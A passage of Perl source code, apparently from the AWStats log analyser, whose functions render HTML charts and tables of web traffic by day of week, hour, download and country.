$avg_dayofweek_p[$_] ) ) {\n\t\t\t\t\t\t$avg_dayofweek_p[$_] = int( $avg_dayofweek_p[$_] );\n\t\t\t\t\t}\n\t\t\t\t\tif ( $avg_dayofweek_h[$_] == int( $avg_dayofweek_h[$_] ) ) {\n\t\t\t\t\t\t$avg_dayofweek_h[$_] = int( $avg_dayofweek_h[$_] );\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\tmy $function = \"ShowGraph_$pluginname\";\n\t\t\t\t&$function(\n\t\t\t\t\t\"$title\",             \"daysofweek\",\n\t\t\t\t\t$ShowDaysOfWeekStats, \\@blocklabel,\n\t\t\t\t\t\\@vallabel,           \\@valcolor,\n\t\t\t\t\t\\@valmax,             \\@valtotal,\n\t\t\t\t\t\\@valaverage,         \\@valdata\n\t\t\t\t);\n\t\t\t\t$graphdone=1;\n\t\t\t}\n\t\t\tif (! $graphdone) \n\t\t\t{\n\t\t\t\tprint \"<table>\\n\";\n\t\t\t\tprint \"<tr valign=\\\"bottom\\\">\\n\";\n\t\t\t\tfor (@DOWIndex) {\n\t\t\t\t\tmy $bredde_p = 0;\n\t\t\t\t\tmy $bredde_h = 0;\n\t\t\t\t\tmy $bredde_k = 0;\n\t\t\t\t\tif ( $max_h > 0 ) {\n\t\t\t\t\t\t$bredde_p = int(\n\t\t\t\t\t\t\t(\n\t\t\t\t\t\t\t\t  $avg_dayofweek_p[$_] ne '?'\n\t\t\t\t\t\t\t\t? $avg_dayofweek_p[$_]\n\t\t\t\t\t\t\t\t: 0\n\t\t\t\t\t\t\t) / $max_h * $BarHeight\n\t\t\t\t\t\t) + 1;\n\t\t\t\t\t}\n\t\t\t\t\tif ( $max_h > 0 ) {\n\t\t\t\t\t\t$bredde_h = int(\n\t\t\t\t\t\t\t(\n\t\t\t\t\t\t\t\t  $avg_dayofweek_h[$_] ne '?'\n\t\t\t\t\t\t\t\t? $avg_dayofweek_h[$_]\n\t\t\t\t\t\t\t\t: 0\n\t\t\t\t\t\t\t) / $max_h * $BarHeight\n\t\t\t\t\t\t) + 1;\n\t\t\t\t\t}\n\t\t\t\t\tif ( $max_k > 0 ) {\n\t\t\t\t\t\t$bredde_k = int(\n\t\t\t\t\t\t\t(\n\t\t\t\t\t\t\t\t  $avg_dayofweek_k[$_] ne '?'\n\t\t\t\t\t\t\t\t? $avg_dayofweek_k[$_]\n\t\t\t\t\t\t\t\t: 0\n\t\t\t\t\t\t\t) / $max_k * $BarHeight\n\t\t\t\t\t\t) + 1;\n\t\t\t\t\t}\n\t\t\t\t\t$avg_dayofweek_p[$_] = sprintf(\n\t\t\t\t\t\t\"%.2f\",\n\t\t\t\t\t\t(\n\t\t\t\t\t\t\t  $avg_dayofweek_p[$_] ne '?'\n\t\t\t\t\t\t\t? $avg_dayofweek_p[$_]\n\t\t\t\t\t\t\t: 0\n\t\t\t\t\t\t)\n\t\t\t\t\t);\n\t\t\t\t\t$avg_dayofweek_h[$_] = sprintf(\n\t\t\t\t\t\t\"%.2f\",\n\t\t\t\t\t\t(\n\t\t\t\t\t\t\t  $avg_dayofweek_h[$_] ne '?'\n\t\t\t\t\t\t\t? $avg_dayofweek_h[$_]\n\t\t\t\t\t\t\t: 0\n\t\t\t\t\t\t)\n\t\t\t\t\t);\n\t\t\t\t\t$avg_dayofweek_k[$_] = sprintf(\n\t\t\t\t\t\t\"%.2f\",\n\t\t\t\t\t\t(\n\t\t\t\t\t\t\t  $avg_dayofweek_k[$_] ne '?'\n\t\t\t\t\t\t\t? $avg_dayofweek_k[$_]\n\t\t\t\t\t\t\t: 0\n\t\t\t\t\t\t)\n\t\t\t\t\t);\n\n\t\t\t\t\t# Remove decimal part that are .0\n\t\t\t\t\tif ( $avg_dayofweek_p[$_] == int( $avg_dayofweek_p[$_] ) ) {\n\t\t\t\t\t\t$avg_dayofweek_p[$_] = int( $avg_dayofweek_p[$_] );\n\t\t\t\t\t}\n\t\t\t\t\tif ( $avg_dayofweek_h[$_] == int( $avg_dayofweek_h[$_] ) ) {\n\t\t\t\t\t\t$avg_dayofweek_h[$_] = int( $avg_dayofweek_h[$_] );\n\t\t\t\t\t}\n\t\t\t\t\tprint \"<td valign=\\\"bottom\\\">\";\n\t\t\t\t\tif ( $ShowDaysOfWeekStats =~ /P/i ) {\n\t\t\t\t\t\tprint\n\"<img align=\\\"bottom\\\" src=\\\"$DirIcons\\/other\\/$BarPng{'vp'}\\\" height=\\\"$bredde_p\\\" width=\\\"6\\\"\"\n\t\t\t\t\t\t  . AltTitle(\"$Message[56]: $avg_dayofweek_p[$_]\")\n\t\t\t\t\t\t  . \" />\";\n\t\t\t\t\t}\n\t\t\t\t\tif ( $ShowDaysOfWeekStats =~ /H/i ) {\n\t\t\t\t\t\tprint\n\"<img align=\\\"bottom\\\" src=\\\"$DirIcons\\/other\\/$BarPng{'vh'}\\\" height=\\\"$bredde_h\\\" width=\\\"6\\\"\"\n\t\t\t\t\t\t  . AltTitle(\"$Message[57]: $avg_dayofweek_h[$_]\")\n\t\t\t\t\t\t  . \" />\";\n\t\t\t\t\t}\n\t\t\t\t\tif ( $ShowDaysOfWeekStats =~ /B/i ) {\n\t\t\t\t\t\tprint\n\"<img align=\\\"bottom\\\" src=\\\"$DirIcons\\/other\\/$BarPng{'vk'}\\\" height=\\\"$bredde_k\\\" width=\\\"6\\\"\"\n\t\t\t\t\t\t  . AltTitle( \"$Message[75]: \"\n\t\t\t\t\t\t\t  . Format_Bytes( $avg_dayofweek_k[$_] ) )\n\t\t\t\t\t\t  . \" />\";\n\t\t\t\t\t}\n\t\t\t\t\tprint \"</td>\\n\";\n\t\t\t\t}\n\t\t\t\tprint \"</tr>\\n\";\n\t\t\t\tprint \"<tr\" . Tooltip(17) . \">\\n\";\n\t\t\t\tfor (@DOWIndex) {\n\t\t\t\t\tprint \"<td\"\n\t\t\t\t\t  . ( $_ =~ /[06]/ ? \" bgcolor=\\\"#$color_weekend\\\"\" : \"\" )\n\t\t\t\t\t  . \">\"\n\t\t\t\t\t  . (\n\t\t\t\t\t\t!$StaticLinks\n\t\t\t\t\t\t  && $_ == ( $nowwday - 1 )\n\t\t\t\t\t\t  && $MonthRequired == $nowmonth\n\t\t\t\t\t\t  && $YearRequired == $nowyear\n\t\t\t\t\t\t? '<span class=\"currentday\">'\n\t\t\t\t\t\t: ''\n\t\t\t\t\t  );\n\t\t\t\t\tprint $Message[ $_ + 84 ];\n\t\t\t\t\tprint(   !$StaticLinks\n\t\t\t\t\t\t  && $_ == ( $nowwday - 1 )\n\t\t\t\t\t\t  && $MonthRequired == $nowmonth\n\t\t\t\t\t\t  && $YearRequired == $nowyear ? '</span>' : '' );\n\t\t\t\t\tprint \"</td>\";\n\t\t\t\t}\n\t\t\t\tprint \"</tr>\\n</table>\\n\";\n\t\t\t}\n\t\t\tprint \"<br />\\n\";\n\n\t\t\t# Show data array for days of week\n\t\t\tif ($AddDataArrayShowDaysOfWeekStats) {\n\t\t\t\tprint \"<table>\\n\";\n\t\t\t\tprint\n\"<tr><td width=\\\"80\\\" bgcolor=\\\"#$color_TableBGRowTitle\\\">$Message[4]</td>\";\n\t\t\t\tif ( $ShowDaysOfWeekStats =~ /P/i ) {\n\t\t\t\t\tprint \"<td width=\\\"80\\\" bgcolor=\\\"#$color_p\\\"\"\n\t\t\t\t\t  . Tooltip(3)\n\t\t\t\t\t  . \">$Message[56]</td>\";\n\t\t\t\t}\n\t\t\t\tif ( $ShowDaysOfWeekStats =~ /H/i ) {\n\t\t\t\t\tprint \"<td width=\\\"80\\\" bgcolor=\\\"#$color_h\\\"\"\n\t\t\t\t\t  . Tooltip(4)\n\t\t\t\t\t  . \">$Message[57]</td>\";\n\t\t\t\t}\n\t\t\t\tif ( $ShowDaysOfWeekStats =~ /B/i ) {\n\t\t\t\t\tprint \"<td width=\\\"80\\\" bgcolor=\\\"#$color_k\\\"\"\n\t\t\t\t\t  . Tooltip(5)\n\t\t\t\t\t  . \">$Message[75]</td></tr>\";\n\t\t\t\t}\n\t\t\t\tfor (@DOWIndex) {\n\t\t\t\t\tprint \"<tr\"\n\t\t\t\t\t  . ( $_ =~ /[06]/ ? \" bgcolor=\\\"#$color_weekend\\\"\" : \"\" )\n\t\t\t\t\t  . \">\";\n\t\t\t\t\tprint \"<td>\"\n\t\t\t\t\t  . (\n\t\t\t\t\t\t!$StaticLinks\n\t\t\t\t\t\t  && $_ == ( $nowwday - 1 )\n\t\t\t\t\t\t  && $MonthRequired == $nowmonth\n\t\t\t\t\t\t  && $YearRequired == $nowyear\n\t\t\t\t\t\t? '<span class=\"currentday\">'\n\t\t\t\t\t\t: ''\n\t\t\t\t\t  );\n\t\t\t\t\tprint $Message[ $_ + 84 ];\n\t\t\t\t\tprint(   !$StaticLinks\n\t\t\t\t\t\t  && $_ == ( $nowwday - 1 )\n\t\t\t\t\t\t  && $MonthRequired == $nowmonth\n\t\t\t\t\t\t  && $YearRequired == $nowyear ? '</span>' : '' );\n\t\t\t\t\tprint \"</td>\";\n\t\t\t\t\tif ( $ShowDaysOfWeekStats =~ /P/i ) {\n\t\t\t\t\t\tprint \"<td>\", Format_Number(int($avg_dayofweek_p[$_])), \"</td>\";\n\t\t\t\t\t}\n\t\t\t\t\tif ( $ShowDaysOfWeekStats =~ /H/i ) {\n\t\t\t\t\t\tprint \"<td>\", Format_Number(int($avg_dayofweek_h[$_])), \"</td>\";\n\t\t\t\t\t}\n\t\t\t\t\tif ( $ShowDaysOfWeekStats =~ /B/i ) {\n\t\t\t\t\t\tprint \"<td>\", Format_Bytes(int($avg_dayofweek_k[$_])),\n\t\t\t\t\t\t  \"</td>\";\n\t\t\t\t\t}\n\t\t\t\t\tprint \"</tr>\\n\";\n\t\t\t\t}\n\t\t\t\tprint \"</table>\\n<br />\\n\";\n\t\t\t}\n\n\t\t\tprint \"</center></td>\";\n\t\t\tprint \"</tr>\\n\";\n\t\t\t&tab_end();\n}\n\n#------------------------------------------------------------------------------\n# Function:     Prints the Downloads chart and table\n# Parameters:   -\n# Input:        $NewLinkParams, $NewLinkTarget\n# Output:       HTML\n# Return:       -\n#------------------------------------------------------------------------------\nsub HTMLMainDownloads{\n\tmy $NewLinkParams = shift;\n\tmy $NewLinkTarget = shift;\n\tif (!$LevelForFileTypesDetection > 0){return;}\n\tif ($Debug) { debug( \"ShowDownloadStats\", 2 ); }\n\tmy $regext         = qr/\\.(\\w{1,6})$/;\n\tprint \"$Center<a name=\\\"downloads\\\">&nbsp;</a><br />\\n\";\n\tmy $Totalh = 0;\n\tif ($MaxNbOf{'DownloadsShown'} < 1){$MaxNbOf{'DownloadsShown'} = 10;}\t# default if undefined\n\tmy $title =\n\t  \"$Message[178] ($Message[77] $MaxNbOf{'DownloadsShown'}) &nbsp; - &nbsp; <a href=\\\"\"\n\t  . (\n\t\t$ENV{'GATEWAY_INTERFACE'}\n\t\t  || !$StaticLinks\n\t\t? XMLEncode(\"$AWScript${NewLinkParams}output=downloads\")\n\t\t: \"$StaticLinks.downloads.$StaticExt\"\n\t  )\n\t  . \"\\\"$NewLinkTarget>$Message[80]</a>\";\n\n    if ( $AddLinkToExternalCGIWrapper && ($ENV{'GATEWAY_INTERFACE'} || !$StaticLinks) ) {\n        # extend the title to include the added link\n            $title = \"$title &nbsp; - &nbsp; <a href=\\\"\" . (XMLEncode(\n                \"$AddLinkToExternalCGIWrapper\" . \"?section=DOWNLOADS&baseName=$DirData/$PROG\"\n            . \"&month=$MonthRequired&year=$YearRequired&day=$DayRequired\"\n            . \"&siteConfig=$SiteConfig\" )\n            . \"\\\"$NewLinkTarget>$Message[179]</a>\");\n    }\n\t  \n\t&tab_head( \"$title\", 0, 0, 'downloads' );\n\tmy $cnt=0;\n\tfor my $u (sort {$_downloads{$b}->{'AWSTATS_HITS'} <=> $_downloads{$a}->{'AWSTATS_HITS'}}(keys %_downloads) ){\n\t\t$Totalh += $_downloads{$u}->{'AWSTATS_HITS'};\n\t\t$cnt++;\n\t\tif ($cnt > 4){last;}\n\t}\n\t# Graph the top five in a pie chart\n\tif (scalar keys %_downloads > 1){\n\t\tforeach my $pluginname ( keys %{ $PluginsLoaded{'ShowGraph'} } )\n\t\t{\n\t\t\tmy @blocklabel = ();\n\t\t\tmy @valdata = ();\n\t\t\tmy @valcolor = ($color_p);\n\t\t\tmy $cnt = 0;\n\t\t\tfor my $u (sort {$_downloads{$b}->{'AWSTATS_HITS'} <=> $_downloads{$a}->{'AWSTATS_HITS'}}(keys %_downloads) ){\n\t\t\t\tpush @valdata, ($_downloads{$u}->{'AWSTATS_HITS'} / $Totalh * 1000 ) / 10;\n\t\t\t\tpush @blocklabel, Get_Filename($u);\n\t\t\t\t$cnt++;\n\t\t\t\tif ($cnt > 4) { last; }\n\t\t\t}\n\t\t\tmy $columns = 2;\n\t\t\tif ($ShowDownloadsStats =~ /H/i){$columns += length($ShowDownloadsStats)+1;}\n\t\t\telse{$columns += length($ShowDownloadsStats);}\n\t\t\tprint \"<tr><td colspan=\\\"$columns\\\">\";\n\t\t\tmy $function = \"ShowGraph_$pluginname\";\n\t\t\t&$function(\n\t\t\t\t\"$Message[80]\",              \"downloads\",\n\t\t\t\t0, \t\t\t\t\t\t\\@blocklabel,\n\t\t\t\t0,           \t\t\t\\@valcolor,\n\t\t\t\t0,              \t\t0,\n\t\t\t\t0,          \t\t\t\\@valdata\n\t\t\t);\n\t\t\tprint \"</td></tr>\";\n\t\t}\n\t}\n\t\n\tmy $total_dls = scalar keys %_downloads;\n\tprint \"<tr bgcolor=\\\"#$color_TableBGRowTitle\\\"><th colspan=\\\"2\\\">$Message[178]: $total_dls</th>\";\n\tif ( $ShowDownloadsStats =~ /H/i ){print \"<th bgcolor=\\\"#$color_h\\\" width=\\\"80\\\">$Message[57]</th>\"\n\t\t.\"<th bgcolor=\\\"#$color_h\\\" width=\\\"80\\\">206 $Message[57]</th>\"; }\n\tif ( $ShowDownloadsStats =~ /B/i ){\n\t\tprint \"<th bgcolor=\\\"#$color_k\\\" width=\\\"80\\\">$Message[75]</th>\";\n\t\tprint \"<th bgcolor=\\\"#$color_k\\\" width=\\\"80\\\">$Message[106]</th>\"; \n\t}\n\tprint \"</tr>\\n\";\n\tmy $count   = 0;\n\tfor my $u (sort {$_downloads{$b}->{'AWSTATS_HITS'} <=> $_downloads{$a}->{'AWSTATS_HITS'}}(keys %_downloads) ){\n\t\tprint \"<tr>\";\n\t\tmy $ext = Get_Extension($regext, $u);\n\t\tif ( !$ext) {\n\t\t\tprint \"<td\"\n\t\t\t  . ( $count ? \"\" : \" width=\\\"$WIDTHCOLICON\\\"\" )\n\t\t\t  . \"><img src=\\\"$DirIcons\\/mime\\/unknown.png\\\"\"\n\t\t\t  . AltTitle(\"\")\n\t\t\t  . \" /></td>\";\n\t\t}\n\t\telse {\n\t\t\tmy $nameicon = $MimeHashLib{$ext}[0] || \"notavailable\";\n\t\t\tmy $nametype = $MimeHashFamily{$MimeHashLib{$ext}[0]} || \"&nbsp;\";\n\t\t\tprint \"<td\"\n\t\t\t  . ( $count ? \"\" : \" width=\\\"$WIDTHCOLICON\\\"\" )\n\t\t\t  . \"><img src=\\\"$DirIcons\\/mime\\/$nameicon.png\\\"\"\n\t\t\t  . AltTitle(\"\")\n\t\t\t  . \" /></td>\";\n\t\t}\n\t\tprint \"<td class=\\\"aws\\\">\";\n\t\t&HTMLShowURLInfo($u);\n\t\tprint \"</td>\";\n\t\tif ( $ShowDownloadsStats =~ /H/i ){\n\t\t\tprint \"<td>\".Format_Number($_downloads{$u}->{'AWSTATS_HITS'}).\"</td>\";\n\t\t\tprint \"<td>\".Format_Number($_downloads{$u}->{'AWSTATS_206'}).\"</td>\";\n\t\t}\n\t\tif ( $ShowDownloadsStats =~ /B/i ){\n\t\t\tprint \"<td>\".Format_Bytes($_downloads{$u}->{'AWSTATS_SIZE'}).\"</td>\";\n\t\t\tprint \"<td>\".Format_Bytes(($_downloads{$u}->{'AWSTATS_SIZE'}/\n\t\t\t\t\t($_downloads{$u}->{'AWSTATS_HITS'} + $_downloads{$u}->{'AWSTATS_206'}))).\"</td>\";\n\t\t}\n\t\tprint \"</tr>\\n\";\n\t\t$count++;\n\t\tif ($count >= $MaxNbOf{'DownloadsShown'}){last;}\n\t}\n\t&tab_end();\n}\n\n#------------------------------------------------------------------------------\n# Function:     Prints the hours chart and table\n# Parameters:   $NewLinkParams, $NewLinkTarget\n# Input:        -\n# Output:       HTML\n# Return:       -\n#------------------------------------------------------------------------------\nsub HTMLMainHours{\n    my $NewLinkParams = shift;\n    my $NewLinkTarget = shift;\n        \n    if ($Debug) { debug( \"ShowHoursStats\", 2 ); }\n\tprint \"$Center<a name=\\\"hours\\\">&nbsp;</a><br />\\n\";\n\tmy $title = \"$Message[20]\";\n\t\n    if ( $AddLinkToExternalCGIWrapper && ($ENV{'GATEWAY_INTERFACE'} || !$StaticLinks) ) {\n       # extend the title to include the added link \n           $title = \"$title &nbsp; - &nbsp; <a href=\\\"\" . (XMLEncode(\n               \"$AddLinkToExternalCGIWrapper\" . \"?section=TIME&baseName=$DirData/$PROG\"\n           . \"&month=$MonthRequired&year=$YearRequired&day=$DayRequired\"\n           . \"&siteConfig=$SiteConfig\" )\n           . \"\\\"$NewLinkTarget>$Message[179]</a>\");\n    } \n\t\n\tif ( $PluginsLoaded{'GetTimeZoneTitle'}{'timezone'} ) {\n\t\t$title .= \" (GMT \"\n\t\t  . ( GetTimeZoneTitle_timezone() >= 0 ? \"+\" : \"\" )\n\t\t  . int( GetTimeZoneTitle_timezone() ) . \")\";\n\t}\n\t&tab_head( \"$title\", 19, 0, 'hours' );\n\tprint \"<tr><td align=\\\"center\\\">\\n\";\n\tprint \"<center>\\n\";\n\n\tmy $max_h = my $max_k = 1;\n\tfor ( my $ix = 0 ; $ix <= 23 ; $ix++ ) {\n\n\t\t#if ($_time_p[$ix]>$max_p) { $max_p=$_time_p[$ix]; }\n\t\tif ( $_time_h[$ix] > $max_h ) { $max_h = $_time_h[$ix]; }\n\t\tif ( $_time_k[$ix] > $max_k ) { $max_k = $_time_k[$ix]; }\n\t}\n\n\t# Show bars for hour\n\tmy $graphdone=0;\n\tforeach my $pluginname ( keys %{ $PluginsLoaded{'ShowGraph'} } )\n\t{\n\t\tmy @blocklabel = ( 0 .. 23 );\n\t\tmy @vallabel   =\n\t\t  ( \"$Message[56]\", \"$Message[57]\", \"$Message[75]\" );\n\t\tmy @valcolor = ( \"$color_p\", \"$color_h\", \"$color_k\" );\n\t\tmy @valmax = ( int($max_h), int($max_h), int($max_k) );\n\t\tmy @valtotal   = ( $TotalPages,   $TotalHits,   $TotalBytes );\n\t\tmy @valaverage = ( $AveragePages, $AverageHits, $AverageBytes );\n\t\tmy @valdata    = ();\n\t\tmy $xx         = 0;\n\t\tfor ( 0 .. 23 ) {\n\t\t\t$valdata[ $xx++ ] = $_time_p[$_] || 0;\n\t\t\t$valdata[ $xx++ ] = $_time_h[$_] || 0;\n\t\t\t$valdata[ $xx++ ] = $_time_k[$_] || 0;\n\t\t}\n\t\tmy $function = \"ShowGraph_$pluginname\";\n\t\t&$function(\n\t\t\t\"$title\",        \"hours\",\n\t\t\t$ShowHoursStats, \\@blocklabel,\n\t\t\t\\@vallabel,      \\@valcolor,\n\t\t\t\\@valmax,        \\@valtotal,\n\t\t\t\\@valaverage,    \\@valdata\n\t\t);\n\t\t$graphdone=1;\n\t}\n\tif (! $graphdone) \n\t{\n\t\tprint \"<table>\\n\";\n\t\tprint \"<tr valign=\\\"bottom\\\">\\n\";\n\t\tfor ( my $ix = 0 ; $ix <= 23 ; $ix++ ) {\n\t\t\tmy $bredde_p = 0;\n\t\t\tmy $bredde_h = 0;\n\t\t\tmy $bredde_k = 0;\n\t\t\tif ( $max_h > 0 ) {\n\t\t\t\t$bredde_p =\n\t\t\t\t  int( $BarHeight * $_time_p[$ix] / $max_h ) + 1;\n\t\t\t}\n\t\t\tif ( $max_h > 0 ) {\n\t\t\t\t$bredde_h =\n\t\t\t\t  int( $BarHeight * $_time_h[$ix] / $max_h ) + 1;\n\t\t\t}\n\t\t\tif ( $max_k > 0 ) {\n\t\t\t\t$bredde_k =\n\t\t\t\t  int( $BarHeight * $_time_k[$ix] / $max_k ) + 1;\n\t\t\t}\n\t\t\tprint \"<td>\";\n\t\t\tif ( $ShowHoursStats =~ /P/i ) {\n\t\t\t\tprint\n\"<img align=\\\"bottom\\\" src=\\\"$DirIcons\\/other\\/$BarPng{'vp'}\\\" height=\\\"$bredde_p\\\" width=\\\"6\\\"\"\n\t\t\t\t  . AltTitle( \"$Message[56]: \" . int( $_time_p[$ix] ) )\n\t\t\t\t  . \" />\";\n\t\t\t}\n\t\t\tif ( $ShowHoursStats =~ /H/i ) {\n\t\t\t\tprint\n\"<img align=\\\"bottom\\\" src=\\\"$DirIcons\\/other\\/$BarPng{'vh'}\\\" height=\\\"$bredde_h\\\" width=\\\"6\\\"\"\n\t\t\t\t  . AltTitle( \"$Message[57]: \" . int( $_time_h[$ix] ) )\n\t\t\t\t  . \" />\";\n\t\t\t}\n\t\t\tif ( $ShowHoursStats =~ /B/i ) {\n\t\t\t\tprint\n\"<img align=\\\"bottom\\\" src=\\\"$DirIcons\\/other\\/$BarPng{'vk'}\\\" height=\\\"$bredde_k\\\" width=\\\"6\\\"\"\n\t\t\t\t  . AltTitle(\n\t\t\t\t\t\"$Message[75]: \" . Format_Bytes( $_time_k[$ix] ) )\n\t\t\t\t  . \" />\";\n\t\t\t}\n\t\t\tprint \"</td>\\n\";\n\t\t}\n\t\tprint \"</tr>\\n\";\n\n\t\t# Show hour lib\n\t\tprint \"<tr\" . Tooltip(17) . \">\";\n\t\tfor ( my $ix = 0 ; $ix <= 23 ; $ix++ ) {\n\t\t\tprint \"<th width=\\\"19\\\">$ix</th>\\n\"\n\t\t\t  ;   # width=19 instead of 18 to avoid a MacOS browser bug.\n\t\t}\n\t\tprint \"</tr>\\n\";\n\n\t\t# Show clock icon\n\t\tprint \"<tr\" . Tooltip(17) . \">\\n\";\n\t\tfor ( my $ix = 0 ; $ix <= 23 ; $ix++ ) {\n\t\t\tmy $hrs = ( $ix >= 12 ? $ix - 12 : $ix );\n\t\t\tmy $hre = ( $ix >= 12 ? $ix - 11 : $ix + 1 );\n\t\t\tmy $apm = ( $ix >= 12 ? \"pm\"     : \"am\" );\n\t\t\tprint\n\"<td><img src=\\\"$DirIcons\\/clock\\/hr$hre.png\\\" width=\\\"12\\\" alt=\\\"$hrs:00 - $hre:00 $apm\\\" /></td>\\n\";\n\t\t}\n\t\tprint \"</tr>\\n\";\n\t\tprint \"</table>\\n\";\n\t}\n\tprint \"<br />\\n\";\n\n\t# Show data array for hours\n\tif ($AddDataArrayShowHoursStats) {\n\t\tprint \"<table width=\\\"650\\\"><tr>\\n\";\n\t\tprint \"<td align=\\\"center\\\"><center>\\n\";\n\n\t\tprint \"<table>\\n\";\n\t\tprint\n\"<tr><td width=\\\"80\\\" bgcolor=\\\"#$color_TableBGRowTitle\\\">$Message[20]</td>\";\n\t\tif ( $ShowHoursStats =~ /P/i ) {\n\t\t\tprint \"<td width=\\\"80\\\" bgcolor=\\\"#$color_p\\\"\"\n\t\t\t  . Tooltip(3)\n\t\t\t  . \">$Message[56]</td>\";\n\t\t}\n\t\tif ( $ShowHoursStats =~ /H/i ) {\n\t\t\tprint \"<td width=\\\"80\\\" bgcolor=\\\"#$color_h\\\"\"\n\t\t\t  . Tooltip(4)\n\t\t\t  . \">$Message[57]</td>\";\n\t\t}\n\t\tif ( $ShowHoursStats =~ /B/i ) {\n\t\t\tprint \"<td width=\\\"80\\\" bgcolor=\\\"#$color_k\\\"\"\n\t\t\t  . Tooltip(5)\n\t\t\t  . \">$Message[75]</td>\";\n\t\t}\n\t\tprint \"</tr>\";\n\t\tfor ( my $ix = 0 ; $ix <= 11 ; $ix++ ) {\n\t\t\tmy $monthix = ( $ix < 10 ? \"0$ix\" : \"$ix\" );\n\t\t\tprint \"<tr>\";\n\t\t\tprint \"<td>$monthix</td>\";\n\t\t\tif ( $ShowHoursStats =~ /P/i ) {\n\t\t\t\tprint \"<td>\",\n\t\t\t\t  Format_Number($_time_p[$monthix] ? $_time_p[$monthix] : \"0\"),\n\t\t\t\t  \"</td>\";\n\t\t\t}\n\t\t\tif ( $ShowHoursStats =~ /H/i ) {\n\t\t\t\tprint \"<td>\",\n\t\t\t\t  Format_Number($_time_h[$monthix] ? $_time_h[$monthix] : \"0\"),\n\t\t\t\t  \"</td>\";\n\t\t\t}\n\t\t\tif ( $ShowHoursStats =~ /B/i ) {\n\t\t\t\tprint \"<td>\", Format_Bytes( int( $_time_k[$monthix] ) ),\n\t\t\t\t  \"</td>\";\n\t\t\t}\n\t\t\tprint \"</tr>\\n\";\n\t\t}\n\t\tprint \"</table>\\n\";\n\n\t\tprint \"</center></td>\";\n\t\tprint \"<td width=\\\"10\\\">&nbsp;</td>\";\n\t\tprint \"<td align=\\\"center\\\"><center>\\n\";\n\n\t\tprint \"<table>\\n\";\n\t\tprint\n\"<tr><td width=\\\"80\\\" bgcolor=\\\"#$color_TableBGRowTitle\\\">$Message[20]</td>\";\n\t\tif ( $ShowHoursStats =~ /P/i ) {\n\t\t\tprint \"<td width=\\\"80\\\" bgcolor=\\\"#$color_p\\\"\"\n\t\t\t  . Tooltip(3)\n\t\t\t  . \">$Message[56]</td>\";\n\t\t}\n\t\tif ( $ShowHoursStats =~ /H/i ) {\n\t\t\tprint \"<td width=\\\"80\\\" bgcolor=\\\"#$color_h\\\"\"\n\t\t\t  . Tooltip(4)\n\t\t\t  . \">$Message[57]</td>\";\n\t\t}\n\t\tif ( $ShowHoursStats =~ /B/i ) {\n\t\t\tprint \"<td width=\\\"80\\\" bgcolor=\\\"#$color_k\\\"\"\n\t\t\t  . Tooltip(5)\n\t\t\t  . \">$Message[75]</td>\";\n\t\t}\n\t\tprint \"</tr>\\n\";\n\t\tfor ( my $ix = 12 ; $ix <= 23 ; $ix++ ) {\n\t\t\tmy $monthix = ( $ix < 10 ? \"0$ix\" : \"$ix\" );\n\t\t\tprint \"<tr>\";\n\t\t\tprint \"<td>$monthix</td>\";\n\t\t\tif ( $ShowHoursStats =~ /P/i ) {\n\t\t\t\tprint \"<td>\",\n\t\t\t\t  Format_Number($_time_p[$monthix] ? $_time_p[$monthix] : \"0\"),\n\t\t\t\t  \"</td>\";\n\t\t\t}\n\t\t\tif ( $ShowHoursStats =~ /H/i ) {\n\t\t\t\tprint \"<td>\",\n\t\t\t\t  Format_Number($_time_h[$monthix] ? $_time_h[$monthix] : \"0\"),\n\t\t\t\t  \"</td>\";\n\t\t\t}\n\t\t\tif ( $ShowHoursStats =~ /B/i ) {\n\t\t\t\tprint \"<td>\", Format_Bytes( int( $_time_k[$monthix] ) ),\n\t\t\t\t  \"</td>\";\n\t\t\t}\n\t\t\tprint \"</tr>\\n\";\n\t\t}\n\t\tprint \"</table>\\n\";\n\n\t\tprint \"</center></td></tr></table>\\n\";\n\t\tprint \"<br />\\n\";\n\t}\n\n\tprint \"</center></td></tr>\\n\";\n\t&tab_end();\n}\n\n#------------------------------------------------------------------------------\n# Function:     Prints the countries chart and table\n# Parameters:   $NewLinkParams, $NewLinkTarget\n# Input:        -\n# Output:       HTML\n# Return:       -\n#------------------------------------------------------------------------------\nsub HTMLMainCountries{\n\tmy $NewLinkParams = shift;\n\tmy $NewLinkTarget = shift;\n\t\n\tif ($Debug) { debug( \"ShowDomainsStats\", 2 ); }\n\tprint \"$Center<a name=\\\"countries\\\">&nbsp;</a><br />\\n\";\n\tmy $title =\n\"$Message[25] ($Message[77] $MaxNbOf{'Domain'}) &nbsp; - &nbsp; <a href=\\\"\"\n\t  . (\n\t\t$ENV{'GATEWAY_INTERFACE'}\n\t\t  || !$StaticLinks\n\t\t? XMLEncode(\"$AWScript${NewLinkParams}output=alldomains\")\n\t\t: \"$StaticLinks.alldomains.$StaticExt\"\n\t  )\n\t  . \"\\\"$NewLinkTarget>$Message[80]</a>\";\n\t  \n\n    if ( $AddLinkToExternalCGIWrapper && ($ENV{'GATEWAY_INTERFACE'} || !$StaticLinks) ) {\n       # extend the title to include the added link\n           $title = \"$title &nbsp; - &nbsp; <a href=\\\"\" . (XMLEncode(\n               \"$AddLinkToExternalCGIWrapper\" . \"?section=DOMAIN&baseName=$DirData/$PROG\"\n           . \"&month=$MonthRequired&year=$YearRequired&day=$DayRequired\"\n           . \"&siteConfig=$SiteConfig\" )\n           . \"\\\"$NewLinkTarget>$Message[179]</a>\");\n    }\n        \t  \n\t&tab_head( \"$title\", 19, 0, 'countries' );\n\t\n\tmy $total_u = my $total_v = my $total_p = my $total_h = my $total_k = 0;\n\tmy $max_h = 1;\n\tforeach ( values %_domener_h ) {\n\t\tif ( $_ > $max_h ) { $max_h = $_; }\n\t}\n\tmy $max_k = 1;\n\tforeach ( values %_domener_k ) {\n\t\tif ( $_ > $max_k ) { $max_k = $_; }\n\t}\n\tmy $count = 0;\n\t\n\t&BuildKeyList(\n\t\t$MaxNbOf{'Domain'}, $MinHit{'Domain'},\n\t\t\\%_domener_h,       \\%_domener_p\n\t);\n\t\n\t# print the map\n\tif (scalar @keylist > 1){\n\t\tforeach my $pluginname ( keys %{ $PluginsLoaded{'ShowGraph'} } )\n\t\t{\n\t\t\tmy @blocklabel = ();\n\t\t\tmy @valdata = ();\n\t\t\tmy $cnt = 0;\n\t\t\tforeach my $key (@keylist) {\n\t\t\t\tpush @valdata, int( $_domener_h{$key} );\n\t\t\t\tpush @blocklabel, $DomainsHashIDLib{$key};\n\t\t\t\t$cnt++;\n\t\t\t\tif ($cnt > 99) { last; }\n\t\t\t}\n\t\t\tprint \"<tr><td 